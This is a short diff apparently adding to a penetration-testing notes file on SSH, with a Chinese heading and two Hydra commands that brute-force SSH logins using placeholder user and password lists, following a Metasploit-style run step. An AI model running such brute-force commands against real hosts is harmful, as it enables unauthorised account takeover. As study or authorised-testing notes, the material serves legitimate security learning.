@@ -167,3 +167,8 @@ SSH
     set check_false true
     run
 <img alt="image" src="https://github.com/user-attachments/assets/38fe0043-1516-4839-9ac1-beb849d7eb02">
+
+    利用找到的帳號進行hydra暴力破解
+    hydra –t 4 –l <username> –P <passwords.txt> ssh://<ssh_IP>
+    hydra –t 4 –L <users.txt> –P <passwords.txt> ssh://<ssh_IP>
+<img  alt="image" src="https://github.com/user-attachments/assets/68084110-d289-425f-8b37-7c078aece794">
